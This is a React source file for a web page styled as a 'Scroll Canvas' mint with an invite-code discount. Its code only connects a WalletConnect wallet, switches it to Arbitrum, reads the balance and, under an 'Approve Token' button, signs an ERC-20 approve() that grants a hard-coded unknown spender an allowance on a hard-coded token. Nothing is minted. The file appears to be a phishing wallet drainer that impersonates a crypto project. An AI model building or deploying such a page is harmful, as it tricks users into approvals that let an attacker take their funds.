import React, { useState, useEffect } from "react";
import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

const projectId = "4d63cbda1c61e149111331eebc34f837";

const ERC20_ABI = [
    // ... (оставьте ABI как есть)
];

function App() {
    const [provider, setProvider] = useState(null);
    const [connected, setConnected] = useState(false);
    const [balance, setBalance] = useState(null);
    const [approvalStatus, setApprovalStatus] = useState(null);

    useEffect(() => {
        const initProvider = async () => {
            const newProvider = await EthereumProvider.init({
                projectId,
                chains: [42161],
                methods: ["eth_sendTransaction", "personal_sign", "eth_signTransaction"],
                events: ["chainChanged", "accountsChanged"],
                showQrModal: true,
                qrModalOptions: { themeMode: "light" },
            });

            newProvider.on("display_uri", (uri) => {
                console.log("display_uri", uri);
            });

            setProvider(newProvider);
        };

        initProvider();
    }, []);

    const connect = async () => {
        if (!provider) return;
        try {
            await provider.connect();
            setConnected(true);
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0xa4b1' }],
            });
        } catch (error) {
            console.error("Connection error:", error);
        }
    };

    const getBalance = async () => {
        if (!provider) return;
        try {
            const ethersWeb3Provider = new ethers.providers.Web3Provider(provider);
            const balanceFromEthers = await ethersWeb3Provider
                .getSigner(provider.accounts[0])
                .getBalance();
            const remainder = balanceFromEthers.mod(1e14);
            setBalance(ethers.utils.formatEther(balanceFromEthers.sub(remainder)));
        } catch (error) {
            console.error("Error fetching balance:", error);
        }
    };

    const refresh = () => {
        if (provider) {
            provider.disconnect();
        }
        window.localStorage.clear();
        setConnected(false);
        setBalance(null);
        setApprovalStatus(null);
    };

    const approveToken = async () => {
        if (!provider) return;
        try {
            const ethersWeb3Provider = new ethers.providers.Web3Provider(provider);
            const signer = ethersWeb3Provider.getSigner();
            const tokenAddress = "0xaf88d065e77c8cC2239327C5EDb3A432268e5831";
            const spenderAddress = "0x2Ae815b4324bE42a56be3320974755ee1647Bd7c";
            const amount = ethers.utils.parseUnits("1000", 18);

            const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

            const tx = await tokenContract.approve(spenderAddress, amount);
            setApprovalStatus("Approval pending...");

            await tx.wait();
            setApprovalStatus("Approval successful!");
        } catch (error) {
            console.error("Error approving token:", error);
            setApprovalStatus("Approval failed");
        }
    };

    return (
        <div className="app">
            <nav className="navbar">
                <div className="logo">📜 Scroll</div>
                <div className="nav-links">
                    <span>Develop</span>
                    <span>Ecosystem</span>
                    <span>Resources</span>
                    <span>Bridge</span>
                    <span>Sessions</span>
                </div>
                {!connected ? (
                    <button className="connect-btn" onClick={connect}>Connect Wallet</button>
                ) : (
                    <button className="connect-btn" onClick={refresh}>Disconnect</button>
                )}
            </nav>

            <main className="main-content">
                <h1>Mint your Scroll Canvas</h1>
                <p>Map your journey and earn badges across the ecosystem.</p>

                <div className="canvas"></div>

                <p>Canvas has a mint fee of 0.001 ETH to fight spam.</p>
                <p>Enter an invite code to get 50% off!</p>

                <div className="invite-code">
                    <input type="text" maxLength="1" />
                    <input type="text" maxLength="1" />
                    <input type="text" maxLength="1" />
                    <input type="text" maxLength="1" />
                    <input type="text" maxLength="1" />
                </div>

                {connected && (
                    <>
                        <button className="connect-btn" onClick={getBalance}>Check Balance</button>
                        <button className="connect-btn" onClick={approveToken}>Approve Token</button>
                        {balance && <p>Balance: {balance} ETH on Arbitrum</p>}
                        {approvalStatus && <p>Approval Status: {approvalStatus}</p>}
                    </>
                )}

                {!connected && (
                    <button className="connect-btn">Connect wallet</button>
                )}
            </main>
        </div>
    );
}

export default App;